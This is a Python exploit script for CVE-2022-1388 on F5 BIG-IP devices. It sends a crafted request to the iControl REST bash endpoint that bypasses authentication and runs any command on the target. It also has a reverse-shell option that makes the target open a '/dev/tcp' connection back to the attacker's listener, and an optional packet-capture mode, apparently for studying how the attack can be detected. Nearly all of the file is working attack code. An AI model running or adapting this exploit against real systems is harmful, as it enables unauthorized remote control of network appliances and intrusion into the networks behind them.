import argparse
import requests
import subprocess
import urllib3
from time import sleep
import sslkeylog


def parse_arguments():
    # Disable the 'InsecureRequestWarning' output
    urllib3.disable_warnings()

    # Initialize Command Line Variables
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", help="Target IP of vulnerable BIG-IP system", required=True)
    parser.add_argument("-p", "--port", help="Target port on vulnerable BIG-IP system", required=True)
    parser.add_argument("-c", "--cmd", "--command", help="Command to run on target system")
    parser.add_argument("-e", "--export", help="Export captured traffic on local machine to pcap. Requires sudo privileges!", action="store_true")
    parser.add_argument("-s", "--shell", help="Launch an interactive shell", action="store_true")
    parser.add_argument("-lh", "--lhost", help="Required for shell; Local IP/interface to bind listener to")
    parser.add_argument("-lp", "--lport", help="Required for shell; Local port to bind listener to", type=int)
    return parser.parse_args()


def export_tcpdump(port, seconds):
    # Initialize SSL Key log for decrypting later with Wireshark
    sslkeylog.set_keylog('ssl-key.log')

    # Start tcpdump
    print(f"[+] Starting tcpdump on port {port} for {seconds} seconds")
    subprocess.Popen(['tcpdump', '-nnp', '-G', str(seconds), '-W', '1', f'port {port}', '-Uwdetection.pcap'],
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def execute_exploit(target, headers, data):
    try:
        response = requests.post(url=target, headers=headers, json=data, verify=False)
        if response.json().get('commandResult'):
            print(response.json()['commandResult'])
    except KeyError:
        print("[+] Exploit finished. If you launched a reverse shell listener, check there for your terminal!")


def main():
    args = parse_arguments()

    target_url = f"https://{args.target}:{args.port}/mgmt/tm/util/bash"
    headers = {
        'Content-Type': 'application/json',
        'Connection': 'X-F5-Auth-Token',
        'X-F5-Auth-Token': 'CVE-2022-1388 Exploit',
        'Authorization': 'Basic YWRtaW46dmFlbHdvbGY='
    }

    if args.export and args.cmd:
        export_tcpdump(args.port, 5)
    elif args.export and args.shell:
        export_tcpdump(args.lport, 600)

    if args.shell:
        if args.lhost and args.lport:
            print(f"[+] If you haven't already, please start your listener of choice on port {args.lport}")
            input("[+] Press any key to continue...")

            data = {
                'command': 'run',
                'utilCmdArgs': f'-c "bash -i >& /dev/tcp/{args.lhost}/{args.lport} 0>&1"'
            }
        else:
            print("[!] Please specify --lhost and --lport!")
            return
    else:
        data = {
            'command': 'run',
            'utilCmdArgs': f'-c "{args.cmd}"'
        }
        if args.export:
            sleep(1)

    execute_exploit(target_url, headers, data)


if __name__ == "__main__":
    main()
